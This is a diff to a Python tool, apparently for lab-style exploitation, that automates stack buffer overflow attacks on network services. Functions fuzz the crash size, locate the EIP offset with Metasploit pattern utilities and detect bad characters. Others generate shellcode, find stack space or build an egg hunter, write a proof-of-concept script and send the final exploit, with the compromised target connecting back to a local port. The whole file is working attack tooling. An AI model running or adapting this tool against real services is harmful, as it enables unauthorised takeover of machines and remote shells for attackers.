@@ -80,11 +80,57 @@ def split_list(lst: list, n: int) -> list[list]:
         yield lst[si:si + (d + 1 if i < r else d)]
 
 
+# @class BOFHelper
+# @abstract Class performing simple buffer overflow against specified target.
+# @discussion     This class exploits a basic buffer overflow (without ASLR, DEP, etc.), cover-
+#                 ing every step involved. With independent functions to handle fuzzing, EIP
+#                 location, bad character detection, shellcode generation, space expansion,
+#                 file generation, and, with everything gathered, exploit dispatch, it provides
+#                 maximum flexibility and customizability for almost any scenario. In addition
+#                 to prefixes and suffixes, it supports live headers to be sent before the payload,
+#                 which would be particularly useful when the attack surface is an HTTP request.
+#                 During the reconnaissance process, this program is designed with minimal user
+#                 interaction in mind. For instance, its automated bad character detection process
+#                 only requires the user to restart the service when prompted, with no need to
+#                 continuously investigate the ESP dump (until all critical bad characters are
+#                 found). It eventually generates a well-formatted Python 2 POC script based on
+#                 the information gathered so that the user can easily replicate the exploit.
+#
+#                 All other types of buffer overflow should be handled by subclasses of this
+#                 base class. Make sure to adhere to the structure and workflow of this class
+#                 and override all necessary functions.
+# @var interface  The interface from which all data would be sent. The local would be obtained
+#                 based on the interface specified.
+# @var local_port The local port that the target would connect to once exploited.
+# @var ip         The remote IP to connect to.
+# @var port       The remote port to connect to.
+# @var header     The live header that is appended before the payload. It could be altered based
+#                 on the circumstance of each send_data() request. Refer to send_data() for more
+#                 details.
+#                 All possible live options are listed in @BOFLiveOptions. To use one, simply
+#                 replace the relevant substring of the header with "BOFLive." plus an option.
+# @var prefix     Fixed prefix of the payload.
+# @var suffix     Fixed suffix of the payload.
+# @var inc        The step of increment during the fuzzing stage.
+# @var timeout    The timeout for send_data() requests. Increase if your connection is slow.
+# @var recv       Set to true only if the service responds to a request. Otherwise, it might
+#                 cause the program to hang.
+# @var ask_crash  Prompt everytime if the service has crashed instead of inferring it from the
+#                 result of send_data(). Set to true if your service can be connected to after
+#                 it crashes.
+# @var strict     In some edge cases, the EIP can be controlled only with a payload of a certain
+#                 size. The program would try to find this value if it is set to true. Beware
+#                 that the process may require extensive use of a debugger and be very tedious.
+# @var verify     Send an empty payload after every send_data() request to verify that the service
+#                 has crashed successfully. May be required in some edge cases.
+# @var debug      Verbose logging.
+
+
 class BOFHelper:
     def __init__(self, interface: str, local_port: int, ip: str, port: int, header: bytes = b"",
                  prefix: bytes = b"", suffix: bytes = b"", inc: int = 200, timeout: float = 10.0,
-                 recv: bool = True, ask_crash: bool = False, strict: bool = False, verify: bool = False,
-                 debug: bool = False):
+                 recv: bool = False, ask_crash: bool = False, strict: bool = False, verify: bool = False,
+                 debug: bool = True):
         self._interface = interface
         self._lPort = local_port
         self._lIP = execute("ip addr show %s | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1" % self._interface) \
@@ -186,6 +232,10 @@ class BOFHelper:
         self._prompt_log("GO! Fire up your debugger! Type anything to continue...")
         input()
 
+    # @function _init_options
+    # @abstract Initialize each option of @self._liveOptions to specified values.
+    # @result   None.
+
     def _init_options(self) -> None:
         for option in BOFLiveOptions:
             full_option = live_option_long(option)
@@ -201,6 +251,11 @@ class BOFHelper:
                 else:
                     self._liveOptions[full_option] = b""
 
+    # @function _process_header_file
+    # @abstract Process the header for use in generated POC.
+    # @param header Original header.
+    # @result       Updated header.
+
     def _process_header_file(self, header: str) -> str:
         header = header.replace(live_option_long("payload_len").decode(), "' + str(len(payload)) + '") \
             .replace(live_option_long("local_host").decode(), self._lIP) \
@@ -213,11 +268,18 @@ class BOFHelper:
     # @abstract Helper function sending data to designated port on the target.
     # @discussion   In this function, a socket is created to send the data in @buffer to @self._port.
     #               The payload would be sent with the predefined prefix and suffix, and if the
-    #               request has timed out, it would be recursively resent (up to five times). To test
-    #               if the service is open, simply pass an empty (i.e. "") @buffer as the argument.
+    #               request has timed out, it would be resent recursively (up to five times). If
+    #               the user has provided a header, its live options, if there is any, would be
+    #               updated based on the current request. To test if the service is open, simply
+    #               pass an empty (i.e. "") @buffer as the argument.
     # @param buffer Bytes object storing the data to be sent.
+    # @param close  Determines whether to close the socket. Set to false when sending the final
+    #               exploit.
     # @param trial  Records the number of time this request has been resent. Set to 5 to disable
     #               resending in case of socket timeout.
+    # @result       BOFErrorSuccess if succeeded; BOFErrorConnectionRefused if connection refused;
+    #               BOFErrorConnectionReset if connection reset; BOFErrorConnectionTimeout if socket
+    #               timed out.
 
     def send_data(self, buffer: bytes, trial: int = 3, close: bool = True) -> int:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -258,6 +320,12 @@ class BOFHelper:
 
         return BOFErrorSuccess
 
+    # @function _check_crash
+    # @abstract Check if the service has crashed, based on @error or user input.
+    # @param error If @self._askCrash has not been set, the status of the service would be determined
+    #              based on it.
+    # @result      True if the service has crashed; False otherwise.
+
     def _check_crash(self, error: int) -> bool:
         if self._askCrash:
             ans = self._input("Did the service crash? (y/n): ").lower()
@@ -268,15 +336,36 @@ class BOFHelper:
             return True
         return False
 
-    # @function _get_byte_for_overflow
+    # @function get_esp_padding
+    # @abstract Ask for the ESP padding.
+    # @result    None.
+
+    def get_esp_padding(self) -> None:
+        ans = self._input("How many bytes are between EIP and ESP (blank to skip): ")
+        if ans == "" or ans == "q":
+            self._espPadding = 0
+            self._espPaddingSet = True
+        self._espPadding = int(ans)
+        self._espPaddingSet = True
+
+    # @function set_esp_padding
+    # @abstract Sets the ESP padding.
+    # @result    None.
+
+    def set_esp_padding(self, padding: int) -> None:
+        self._espPadding = padding
+        self._espPaddingSet = True
+
+    # @function _fuzz_bytes_overflow
     # @abstract Private function for finding a rough number of bytes needed to overflow the service.
     # @discussion     This function recursively sends buffers, incrementing in size each iteration by
     #                 @self._inc, to the service and checks if it has crashed. If an overflow has been
-    #                 triggered successfully, it would return @current for use in its caller get_eip_offset().
+    #                 triggered successfully, it would update @self._numBytes with @current.
     # @param current  The number of bytes that is to be sent to the service in the current iteration.
-    # @result         @current if succeeded; BOFErrorConnectionRefused if failed to connect.
+    # @result         BOFErrorSuccess if succeeded; BOFErrorConnectionRefused if failed on first trial;
+    #                 BOFErrorTimeout if timed out.
 
-    def _get_byte_for_overflow(self, current: int = 0) -> int:
+    def _fuzz_bytes_overflow(self, current: int = 0) -> int:
         if current == 0:
             self._debug_log("Checking if service is open...")
         else:
@@ -290,7 +379,7 @@ class BOFHelper:
         if not self._check_crash(error):
             if current == 0:
                 self._debug_log("Service is open!")
-            return self._get_byte_for_overflow(current + self._inc)
+            return self._fuzz_bytes_overflow(current + self._inc)
 
         # Service crashed -> print and proceed
         if current == 0:
@@ -305,23 +394,42 @@ class BOFHelper:
         self._numBytes = current
         return BOFErrorSuccess
 
+    # @function _ask_eip
+    # @abstract Ask the user if EIP has been successfully overridden and update @self._numBytes if so.
+    # @result   True if EIP is overridden; False otherwise.
+
     def _ask_eip(self, current) -> bool:
         ans = self._input("Is EIP overridden by 90909090 (y/n): ").lower()
         self._prompt_restart()
         if ans == 'y':
             self._success_log("Strict size found: %d" % current)
             self._numBytes = current
-            self._numBytesObtained = True
             self._strictSizeFound = True
             return True
         return False
 
+    # @function _find_crash_threshold
+    # @abstract Find the specific payload length on which the service first crashed.
+    # @discussion Utilizing a binary search approach, this function recursively finds the smallest value
+    #             on which the service would crash which would be used in later functions to find the
+    #             strict payload size with which EIP could be obtained. Note that the debugger should
+    #             the kept open during the execution of this function. Extensive user interaction may
+    #             be required, but it should only be needed in edge cases.
+    # @param high The current minimum number of bytes needed to overflow the service.
+    # @param low  The current maximum number of bytes that would not overflow the service.
+    # @result     BOFErrorSuccess is succeeded; BOFErrorConnectionTimeout if timed out.
+
     def _find_crash_threshold(self, high: int = 0, low: int = 0) -> int:
+        if self._strictSizeFound:
+            return BOFErrorSuccess
+
         # Success!
         if low + 1 == high:
             self._success_log("Crash threshold found: %s!\n" % high)
-            return high
+            self._numBytes = high
+            return BOFErrorSuccess
 
+        self._prompt_debugger()
         mid = low + (high - low) // 2  # Safe way to get mid
         self._debug_log("Sending buffer of size %s..." % mid)
         error = self.send_data(b"\x90" * mid)
@@ -334,38 +442,84 @@ class BOFHelper:
 
         # Service crashed -> set @high to mid
         if self._ask_eip(mid):
-            return mid
+            return BOFErrorSuccess
         return self._find_crash_threshold(mid, low)
 
-    def _find_strict_size(self, current: int) -> int:
-        if self._strictSizeFound:
-            return BOFErrorSuccess
+    # @function get_num_bytes
+    # @abstract Find the particular payload size needed to crash the service and obtain EIP.
+    # @discussion This function starts by fuzzing the service with _fuzz_bytes_overflow() to
+    #             determine a size that would crash the service. If the class is in strict
+    #             mode, it would attempt to first discover the crash threshold with function
+    #             _find_crash_threshold(). With the threshold discovered, this function steps
+    #             up from it one byte at a time in order to find the strict size for EIP control.
+    #             Beware that this function may take a great amount of user interaction.
+    # @result     @self._numBytes if succeeded; BOFErrorFailure if fuzzing failed; BOFErrorInvalid
+    #             if service did not crash; BOFErrorConnectionTimeout if timed out.
 
-        while True:
-            self._prompt_debugger()
-            if not self._check_crash(self.send_data(b"\x90" * current)):
-                self._err_log("Service did not crash! (should never happen)")
-                return BOFErrorInvalid
-            if self._ask_eip(current):
-                return BOFErrorSuccess
-            current += 1
-            continue
-        return BOFErrorInvalid
+    def get_num_bytes(self) -> int:
+        self._func_log("Fuzzing service...")
+        if not self._numBytesObtained:
+            if self._fuzz_bytes_overflow():
+                return BOFErrorFailure
+            self._numBytesObtained = True
 
-    # @function _send_unique_pattern
-    # @abstract Private function to send a unique pattern to the service with a given length.
-    # @discussion   A unique pattern of @length is generated with the msf_pattern_create utility
-    #               and sent to @self._port. If the service has crashed due to overflow, the user
-    #               should provide the value at the EIP register which would be then used to
-    #               identify the exact offset of EIP on the stack.
-    # @param length The length of the pattern to be sent.
-    # @result       @self._eipOffset if succeeded; BOFErrorConnectionRefused if failed to connect;
-    #               BOFErrorServiceAlive if service did not crash; BOFErrorValueNotFound if value
-    #               is not found in pattern.
+        if self._strict and not self._strictSizeFound:
+            if self._find_crash_threshold(self._numBytes, self._numBytes - self._inc) == BOFErrorConnectionTimeout:
+                return BOFErrorConnectionTimeout
+            while True:
+                self._prompt_debugger()
+                if not self._check_crash(self.send_data(b"\x90" * self._numBytes)):
+                    self._err_log("Service did not crash! (should never happen)")
+                    return BOFErrorInvalid
+                if self._ask_eip(self._numBytes):
+                    break
+                self._numBytes += 1
+                continue
 
-    def _send_unique_pattern(self, length: int) -> int:
+        return self._numBytes
+
+    # @function set_num_bytes
+    # @abstract Sets the number of bytes needed to overflow the service.
+    # @param num_bytes The number of bytes required to overflow the service.
+    # @param strict    Sets the class in strict mode.
+    # @result          None.
+
+    def set_num_bytes(self, num_bytes: int, strict: bool = False) -> None:
+        self._strict = strict
+        self._numBytes = num_bytes
+        self._numBytesObtained = True
+        if strict:
+            self._strictSizeFound = True
+
+    # @function get_eip_offset
+    # @abstract Obtain the EIP offset for the specified service.
+    # @discussion With @self._numBytes obtained, this function locates the offset of ESP with a
+    #             unique pattern of length @self._numBytes, generated by the msf_pattern_create
+    #             utility. If the service has crashed due to overflow, the user should provide
+    #             the value at the EIP register which would be then used to identify the exact
+    #             offset of EIP on the stack. The user would also be prompted to provide the
+    #             value at the top of ESP so that the program could automatically calculate the
+    #             ESP padding.
+    # @result     @self._eipOffset if succeeded; BOFErrorConnectionTimeout if service timed out;
+    #             BOFErrorServiceAlive if service did not crash; BOFErrorFailure if the value is
+    #             not found in the pattern; BOFErrorInvalid if @self._numBytes is not obtained
+    #             or if the stack size is too small.
+
+    def get_eip_offset(self) -> int:
+        self._func_log("Locating EIP...")
+        if self._eipObtained:
+            return self._eipOffset
+
+        if not self._numBytesObtained:
+            self._err_log("Please first obtain the number of bytes needed to overflow the service!")
+            return BOFErrorInvalid
+
+        if self._strict and not self._strictSizeFound:
+            self._err_log("Please first obtain the strict payload size!")
+            return BOFErrorInvalid
+
         self._prompt_debugger()
-        error = self.send_data(execute("msf-pattern_create -l %s" % length))
+        error = self.send_data(execute("msf-pattern_create -l %s" % self._numBytes))
         if error == BOFErrorConnectionTimeout:
             return BOFErrorConnectionTimeout
 
@@ -374,10 +528,11 @@ class BOFHelper:
             self._err_log("Service did not crash!")
             return BOFErrorServiceAlive
 
-        # Service crashed -> find EIP
+        # Service crashed -> find EIP & ESP padding
         eip = self._input("Service crashed. Please enter the value in EIP: ").replace("\\x", "").replace("0x", "")
         esp = self._input("Please enter the first 4 bytes of ESP in the stack: ").replace("\\x", "").replace("0x", "")
-        self._step_log("Locating offset of EIP in the pattern...")
+        self._step_log("Locating EIP offset and ESP padding in the pattern...")
+
         try:
             self._eipOffset = int(execute("msf-pattern_offset -q %s" % eip).decode().split()[-1])
             self._espPadding = int(execute("msf-pattern_offset -q %s" % esp).decode().split()[-1]) - self._eipOffset - 4
@@ -385,56 +540,16 @@ class BOFHelper:
         except IndexError:
             self._warn_log("Value not found in pattern!")
             return BOFErrorFailure
+
         self._eipObtained = True
-        self._stackSpace = length - self._eipOffset - 4 - self._espPadding
+        self._stackSpace = self._numBytes - self._eipOffset - 4 - self._espPadding
         if self._stackSpace <= 0:
             self._err_log("Stack space should be greater than 0!")
             return BOFErrorInvalid
-        self._success_log("EIP Offset: %s!" % self._eipOffset)
-        self._success_log("ESP Padding: %s!" % self._espPadding)
+        self._success_log("EIP Offset: %s" % self._eipOffset)
+        self._success_log("ESP Padding: %s" % self._espPadding)
         self._prompt_restart()
-        return BOFErrorSuccess
-
-    # @function get_eip_offset
-    # @abstract Obtain the EIP offset for the specified service.
-    # @discussion Utilizing a binary search approach, this function derives the EIP offset by recursively
-    #             sending data of length @mid, the average of @high and @low. If the service did not crash,
-    #             @low would be increased to @mid, and if it did, @high would be decreased to @mid. The EIP
-    #             would be located exactly at the threshold of the overflow (when @low + 1 == @high).
-    #             Note that the service may need to be restarted repeatedly in order for the function
-    #             to work.
-    # @param high The current minimum number of bytes needed to overflow the service.
-    # @param low  The current maximum number of bytes that would not overflow the service.
-    # @result     @self._eipOffset if succeeded; BOFErrorConnectionRefused if failed to connect.
-
-    def get_eip_offset(self) -> int:
-        if self._eipObtained:
-            return self._eipOffset
-
-        self._func_log("Fuzzing service...")
-        if not self._numBytesObtained:
-            if self._get_byte_for_overflow():
-                return BOFErrorFailure
-            self._numBytesObtained = True
-
-        if self._strict and not self._strictSizeFound:
-            threshold = self._find_crash_threshold(self._numBytes, self._numBytes - self._inc)
-            if threshold == BOFErrorConnectionTimeout:
-                return BOFErrorConnectionTimeout
-            if self._find_strict_size(threshold):
-                return BOFErrorFailure
-
-        self._func_log("Locating EIP...")
-        if self._send_unique_pattern(self._numBytes):
-            return BOFErrorFailure
         return self._eipOffset
-
-    def set_num_bytes(self, num_bytes: int, strict: bool = False):
-        self._strict = strict
-        self._numBytes = num_bytes
-        self._numBytesObtained = True
-        if strict:
-            self._strictSizeFound = True
 
     # @function set_eip_offset
     # @abstract Manually set the EIP offset to a specified value.
@@ -449,17 +564,9 @@ class BOFHelper:
         self._eipOffset = offset
         self._eipObtained = True
 
-    def get_esp_padding(self) -> None:
-        ans = self._input("How many bytes are between EIP and ESP (blank to skip): ")
-        if ans == "" or ans == "q":
-            self._espPadding = 0
-            self._espPaddingSet = True
-        self._espPadding = int(ans)
-        self._espPaddingSet = True
-
-    def set_esp_padding(self, padding: int) -> None:
-        self._espPadding = padding
-        self._espPaddingSet = True
+    # @function __check_input
+    # @abstract Helper function to check for new bad characters in user input.
+    # @result   None.
 
     def __check_input(self) -> None:
         ans = self._input("Enter bad characters found (separate with space): ") \
@@ -472,6 +579,10 @@ class BOFHelper:
             if is_hex(char) and len(char) == 2:
                 self._badChars.append(char)
                 BOFAllHex.remove(char)
+
+    # @function __check_dump
+    # @abstract Helper function to check for new bad characters in hex dump.
+    # @result   None.
 
     def __check_dump(self, chars: list[str]) -> None:
         self._prompt_log("Dump at least %d bytes (stop input with \"q\"): " % len(BOFAllHex))
@@ -501,22 +612,32 @@ class BOFHelper:
                 self._badChars.append(chars[i])
                 BOFAllHex.remove(chars[i])
 
+    # @function __build_bad_buffer
+    # @abstract Build the buffer to send based on the current character list.
+    # @discussion  It would place @chars in the middle of the filler space before EIP.
+    # @param chars The current character list.
+    # @result      The assembled bytes object to send to the service.
+
     def __build_bad_buffer(self, chars: list[str]) -> bytes:
         offset_len = self._eipOffset - len(chars)
         return b"\x90" * (offset_len // 2) \
                + unhexlify("".join(chars)) \
                + b"\x90" * (self._numBytes - len(chars) - (offset_len // 2))
 
-    # @function __send_chars
-    # @abstract Private function sending specified characters to service.
-    # @discussion  This recursive function continuously send a list of strings to the service until all
-    #              bad characters in it have been found. In each iteration, the user has to manually
-    #              find the bad characters and update it through input, which would be then added to
-    #              @self._badChars and removed from the @chars list.
-    # @param chars The list of characters to be sent to the service.
-    # @result      The update @chars if succeeded; [] if failed.
+    # @function __send_chars_user
+    # @abstract Private function sending non-critical characters and asking for user input to determine
+    #           remaining bad characters.
+    # @discussion   After all critical bad characters have been discovered through __send_chars_auto, this
+    #               function sends the updated character list, supposedly causing a crash, and prompts the
+    #               user for either a hex dump or bad characters they identified manually. This is the last
+    #               step of bad character detection.
+    # @param chars  The list of characters to be sent to the service.
+    # @param manual Whether to ask the user to manually identify bad characters instead of providing a hex
+    #               dump.
+    # @result       BOFErrorSuccess if succeeded; BOFErrorConnectionTimeout if timed out; BOFErrorServiceAlive
+    #               if service did not crash.
 
-    def __send_chars(self, chars: list[str], manual: bool = False) -> int:
+    def __send_chars_user(self, chars: list[str], manual: bool = False) -> int:
         error = self.send_data(self.__build_bad_buffer(chars))
         if error == BOFErrorConnectionTimeout:
             return BOFErrorConnectionTimeout
@@ -529,11 +650,19 @@ class BOFHelper:
         self._success_log("Characters sent!")
         if manual:
             self.__check_input()
-            return BOFErrorSuccess
-
-        self._prompt_log("Scroll to the middle of the 90's and make sure the dump starts with 01 02 03 04...!!!")
-        self.__check_dump(chars)
+        else:
+            self._prompt_log("Scroll to the middle of the 90's and make sure the dump starts with 01 02 03 04...!!!")
+            self.__check_dump(chars)
         return BOFErrorSuccess
+
+    # @function __send_chars_auto
+    # @abstract Recursively sends and updates character list to determine critical bad characters
+    # @discussion  This recursive function continuously send a list of string to the service until all
+    #              bad characters in it have been found. If the service did not crash due to send_data(),
+    #              the list would be split in two and sent respectively (with this function). The user
+    #              simply has to repeatedly restart the service as prompted.
+    # @param chars The list of characters to be sent to the service.
+    # @result      BOFErrorSuccess if succeeded; BOFErrorConnectionTimeout if timed out.
 
     def __send_chars_auto(self, chars: list[str]) -> int:
         self._debug_log("Sending: %s" % " ".join(chars))
@@ -555,29 +684,41 @@ class BOFHelper:
 
         # Split
         for chunk in split_list(chars, 2):
-            if self.__send_chars_auto(chunk):
-                return BOFErrorFailure
+            error = self.__send_chars_auto(chunk)
+            if error:
+                return error
 
         return BOFErrorSuccess
+
+    # @function _send_chars
+    # @abstract Helper function to send all hex characters to the service.
+    # @discussion   This function splits BOFAllHex into chunks of @size and sends them respectively with
+    #               either __send_chars_auto() or __send_chars_user().
+    # @param size   The size of each segment to send.
+    # @param auto   Whether to use __send_chars_auto() or __send_chars_user().
+    # @param manual Whether to ask the user to manually identify bad characters instead of providing a
+    #               dump. Taken into account only if auto is set.
+    # @result       BOFErrorSuccess if succeeded; BOFErrorConnectionTimeout if timed out; BOFErrorServiceAlive
+    #               if service did not crash.
 
     def _send_chars(self, size: int, auto: bool = False, manual: bool = False) -> int:
         for i in range(0, len(BOFAllHex), size):
             if auto:
                 error = self.__send_chars_auto(BOFAllHex[i:i + size])
             else:
-                error = self.__send_chars(BOFAllHex[i:i + size], manual)
+                error = self.__send_chars_user(BOFAllHex[i:i + size], manual)
             if error:
                 return error
         return BOFErrorSuccess
 
     # @function find_bad_chars
     # @abstract Find bad characters in the service.
-    # @discussion This function attempts to discover all bad characters presented in the service. It
-    #             places a generated list of all characters in front of EIP, sends it to the service
-    #             with _send_chars(), and sets @self._badCharsFound. If there is not enough space in
-    #             the filler for all characters, this function would automatically split it into several
-    #             roughly equal-sized segments and dispatch one at a time.
-    #             Note that function get_eip_offset() must be run before executing this function.
+    # @discussion This function attempts to discover all bad characters present in the service. It
+    #             initially uses the automated __send_chars_auto() helper to obtain all critical bad
+    #             characters (i.e. ones that would cause the service to not crash). Afterwards, it
+    #             sends the updated list of characters to the services with __send_chars_user(), which
+    #             would ask for user input that indicates the remaining bad characters.
+    #             Note that get_eip_offset() must be run before executing this function.
     # @result     BOFErrorSuccess if succeeded; BOFErrorFailure if failed; BOFErrorInvalid if function
     #             get_eip_offset() is not yet invoked.
 
@@ -611,6 +752,7 @@ class BOFHelper:
     # @function set_bad_chars
     # @abstract Manually input the bad characters identified.
     # @param bad_chars The value @self._badChars is set to.
+    # @result          None.
 
     def set_bad_chars(self, bad_chars: list[str]) -> None:
         for item in bad_chars:
@@ -669,6 +811,13 @@ class BOFHelper:
         self._success_log("Shellcode generated!")
         return BOFErrorSuccess
 
+    # @function _check_space
+    # @abstract Helper function to check if a certain amount of space is available in ESP.
+    # @discussion  It sends a payload with @space amount of bytes after ESP. The space's availability
+    #              is verified if the user confirms that the EIP and stack behave as expected.
+    # @param space The amount of space whose availability would be checked.
+    # @result      True if available; False otherwise.
+
     def _check_space(self, space: int) -> bool:
         self._step_log("Checking if a space of %d is available in ESP..." % space)
         if self._stackSpace >= space:
@@ -682,7 +831,7 @@ class BOFHelper:
             return True
 
         self._prompt_debugger()
-        error = self.send_data(b"\x90" * self._eipOffset + b"A" * 4 + b"\x90" * self._espPadding + b"\x90" * space, 5)
+        error = self.send_data(b"\x90" * self._eipOffset + b"A" * 4 + b"\x90" * (self._espPadding + space), 5)
         if error == BOFErrorConnectionTimeout:
             return False
 
@@ -711,11 +860,10 @@ class BOFHelper:
     #             should ESP prove to be unavailable. If the space before EIP is larger than the
     #             size of @self._shellcode, it would proceed to insert a first stage shellcode in
     #             the ESP so that the program could jump to the shellcode. The user needs to provide
-    #             the register that the filler appears to be in. If there is no space in ESP even
-    #             for the first stage shellcode, the function would ask for an address with an
-    #             instruction that directly jumps to the designated register if possible.
+    #             the register that the filler appears to be in. If no such register exist, an egg
+    #             hunter would be placed in ESP to search in memory for the shellcode.
     # @result     BOFErrorSuccess if succeeded; BOFErrorNoSpace if there is no sufficient space for
-    #             payload.
+    #             payload; BOFErrorServiceAlive if service did not crash.
 
     def _find_space(self) -> int:
         if self._eipOffset < len(self._shellCode):
@@ -743,8 +891,8 @@ class BOFHelper:
             self._warn_log("Register invalid! Building egg hunter...")
             return BOFErrorInvalid
 
-        self._prompt_restart()
         # We have the entire filler space at our disposal
+        self._prompt_restart()
         self._stackSpace = self._eipOffset
         self._spaceExpanded = True
         self._success_log("The filler space (%s) is all yours :)" % self._eipOffset)
@@ -753,15 +901,13 @@ class BOFHelper:
     # @function expand_space
     # @abstract Attempt to expand the available space to store the shellcode.
     # @discussion In order for the shellcode to be injected, there must be sufficient space to store
-    #             it. If there were not an attempt to shrink the buffer in get_eip_offset(), this
-    #             function should be executed to gather more space in the stack. If the available
-    #             space already exceeds the shellcode length, there is no need to run this function.
-    #             After sending a payload of len(@self._shellcode), this function asks user verification
-    #             to check if the space is available. If not, it would proceed to _find_space() to
-    #             look for space before EIP.
-    #             Note that function generate_shellcode() must be run before executing this function.
-    # @result     BOFErrorSuccess if succeeded; BOFErrorServiceAlive if service did not crash; BOFError-
-    #             ConnectionRefused if connection refused.
+    #             it. This function invokes _check_space() with space = len(@self._shellCode) to check
+    #             if the shellcode could be placed in ESP. If not, it would proceed to _find_space() to
+    #             locate space before EIP.
+    #             Note that generate_shellcode() must be run before executing this function.
+    # @result     BOFErrorSuccess if succeeded; BOFErrorNoSpace if there is no sufficient space for
+    #             payload; BOFErrorServiceAlive if service did not crash; BOFErrorInvalid if shellcode
+    #             is not generated or ESP padding is not set.
 
     def expand_space(self) -> int:
         self._func_log("Expanding space...")
@@ -787,8 +933,9 @@ class BOFHelper:
         return self._find_space()
 
     # @function _build_exploit
-    # @abstract Build the exploit after other functions are executed.
-    # @result BOFErrorSuccess if succeeded; BOFErrorInvalid if function expand_space() is not yet invoked.
+    # @abstract Build @self._exploit with the other functions executed.
+    # @result   BOFErrorSuccess if succeeded; BOFErrorInvalid if function expand_space() is not yet invoked
+    #           or if the entered return address is invalid..
 
     def _build_exploit(self) -> int:
         self._func_log("Building exploit...")
@@ -819,8 +966,10 @@ class BOFHelper:
         return BOFErrorSuccess
 
     # @function generate_file
-    # @abstract Generate exploit.py that could be used for manual exploitation.
-    # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.
+    # @abstract Build a Proof of Concept script with the information gathered by other functions.
+    # @discussion The generated script, /tmp/exploit.py, would be in Python 2 format due to issues with
+    #             Python 3 encoding.
+    # @result     BOFErrorSuccess if succeeded; BOFErrorFailure if the exploit is not built successfully.
 
     def generate_file(self) -> int:
         self._func_log("Generating exploit.py...")
@@ -908,7 +1057,8 @@ class BOFHelper:
 
     # @function send_exploit
     # @abstract Dispatch the exploit.
-    # @result BOFErrorSuccess if succeeded; BOFErrorFailure if failed.
+    # @result BOFErrorSuccess if succeeded; BOFErrorConnectionTimeout if timed out; BOFErrorFailure if
+    #         the exploit is not built successfully or if exploitation failed.
 
     def send_exploit(self) -> int:
         self._func_log("Exploiting...")
@@ -938,6 +1088,8 @@ class BOFHelper:
     # @result True if succeeded; False if failed.
 
     def perform_bof(self) -> bool:
+        if self.get_num_bytes() < 0:
+            return False
         if self.get_eip_offset() < 0:
             return False
         if self.find_bad_chars():
